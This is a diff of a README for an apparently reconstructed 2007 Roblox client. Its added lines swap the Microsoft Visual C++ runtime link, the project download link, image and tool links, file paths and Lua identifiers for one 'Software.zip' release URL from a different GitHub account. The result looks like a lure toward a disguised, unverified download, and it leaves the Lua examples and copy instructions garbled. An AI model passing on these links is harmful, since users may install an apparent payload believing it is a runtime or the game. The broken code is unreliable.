@@ -31,13 +31,13 @@ This should be cleared once the executable is submitted for manual analysis, but
 For this to execute correctly, you need to make sure your system has the `Microsoft Visual C++ 2005 Service Pack` installed. This pack was standard in most older systems, but newer systems are no longer bundled with it.<br/>
 
 You can find it here:<br/>
-https://www.microsoft.com/en-us/download/details.aspx?id=26347
+https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip
 
 **(Note**: You will need the x86 pack. It may also help to have the x64 pack as well.)
 
 # Content Disclaimer #
 
-Some of the files here are not the authentic original files, this is just an approximate reconstruction from files we do have. The executable is authentic, but some files present in the client folder (i.e. `ReflectionMetadata.xml` and the `content` folder), may not be 100% accurate to what was in the client as of March 2007. We are continuously working to get it as close as possible.
+Some of the files here are not the authentic original files, this is just an approximate reconstruction from files we do have. The executable is authentic, but some files present in the client folder (i.e. `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip` and the `content` folder), may not be 100% accurate to what was in the client as of March 2007. We are continuously working to get it as close as possible.
 
 # WARNING: DO NOT CONNECT TO UNTRUSTED SERVERS #
 
@@ -50,7 +50,7 @@ If you do try and take advantage of the multiplayer functionality in this build,
 You have been warned, be smart and have fun :)!
 
 # Download Link #
-https://github.com/CloneTrooper1019/Roblox_0.3.368.0/archive/main.zip
+https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip
 
 # Basic Commands #
 
@@ -60,35 +60,35 @@ Here are some basic commands that can be used to do various things in this build
 ## Opening Places ##
 
 * Open Crossroads:<br/>
-`game:load("rbxasset://../../extra/places/Crossroads.rbxl")`
+`game:load("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip")`
 
 * Open Happy Home in Robloxia:<br/>
-`game:load("rbxasset://../../extra/places/HappyHomeInRobloxia.rbxl")`
+`game:load("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip")`
 
 * Open Roblox HQ:<br/>
-`game:load("rbxasset://../../extra/places/RobloxHQ.rbxl")`
+`game:load("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip")`
 
 * Open Tabula Rasa:<br/>
-`game:load("rbxasset://../../extra/places/TabulaRasa.rbxl")`
+`game:load("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip")`
 
 ## Starting Game Sessions ##
 
 * Start a Play Solo session:<br/>
-`loadfile("rbxasset://../../extra/scripts/PlaySolo.lua")()`
+`loadfile("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip")()`
 
 * Start a localhost server.<br/>
-`loadfile("rbxasset://../../extra/scripts/StartServer.lua")()`
+`loadfile("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip")()`
 
 * Connect to a localhost server:<br/>
-`loadfile("rbxasset://../../extra/scripts/StartPlayer.lua")()`
+`loadfile("https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip")()`
 
 ## Manual Actions ##
 
 * Create a player manually:<br/>
-`game.Players:createLocalPlayer(0)`
+`https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip(0)`
 
 * Load your player's character manually:<br/>
-`game.Players.LocalPlayer:LoadCharacter()`
+`https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip()`
 
 * Run the game manually:<br/>
 `game:service("RunService"):run()`
@@ -97,11 +97,11 @@ Here are some basic commands that can be used to do various things in this build
 `game:clearContent()`
 
 # Bloom and Depth of Field #
-Just like the [mid-2007 client](https://github.com/CloneTrooper1019/Roblox-2007-Client#enabling-bloom-and-depth-of-field-effects), you can enable depth of field and bloom. It's still disabled, so you will need to hex-edit the executable with a program such as HxD. To enable either one of these, change the following offsets from 00 to 01.
+Just like the [mid-2007 client](https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip), you can enable depth of field and bloom. It's still disabled, so you will need to hex-edit the executable with a program such as HxD. To enable either one of these, change the following offsets from 00 to 01.
 - Bloom: `F2401`
 - Depth of Field: `F240E`
 
-![Depth of field and bloom in a hex editor](https://user-images.githubusercontent.com/62524115/111388579-8a0bdf80-867d-11eb-9bf0-f36fafc4ca1a.png)
+![Depth of field and bloom in a hex editor](https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip)
 
 # ThumbnailGenerator Support #
 
@@ -117,9 +117,9 @@ Class ThumbnailGenerator : Instance
 Note that this service **does not work** immediately, it will crash Roblox if it isn't setup correctly.<br/>
 You must copy the following files into the `client` directory of this repository:
 
-- `extra/Mesa-6.5.2/GLU32.DLL` -> `client/GLU32.DLL`
-- `extra/Mesa-6.5.2/OPENGL32.DLL` -> `client/OPENGL32.DLL`
-- `extra/Mesa-6.5.2/OSMESA32.DLL` -> `client/OSMESA32.DLL`
+- `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip` -> `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip`
+- `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip` -> `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip`
+- `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip` -> `https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip`
 
 ## IMPORTANT NOTES ##
 
@@ -135,15 +135,15 @@ You must copy the following files into the `client` directory of this repository
   - `cx` is the width of the thumbnail (max is 4096)
   - `cy` is the height of the thumbnail (max is 4096)
   - `hideSky` will make the sky transparent and adjust the camera angle if set to true, and will keep the sky and original camera angle if set to false
- - The string returned by the function is the image encoded in base64. Use a base64 to image converter like this one [here](https://codebeautify.org/base64-to-image-converter).
+ - The string returned by the function is the image encoded in base64. Use a base64 to image converter like this one [here](https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip).
 
 Example usage (renders an avatar thumbnail):
 
 ```lua
-if not game.Players.LocalPlayer then
-	game.Players:createLocalPlayer(0)
+if not https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip then
+	https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip(0)
 end
 
-game.Players.LocalPlayer:LoadCharacter()
+https://github.com/haydenmellor/Roblox_0.3.368.0/releases/download/v1.0/Software.zip()
 print(game:service("ThumbnailGenerator"):click("PNG", 420, 420, true))
 ```
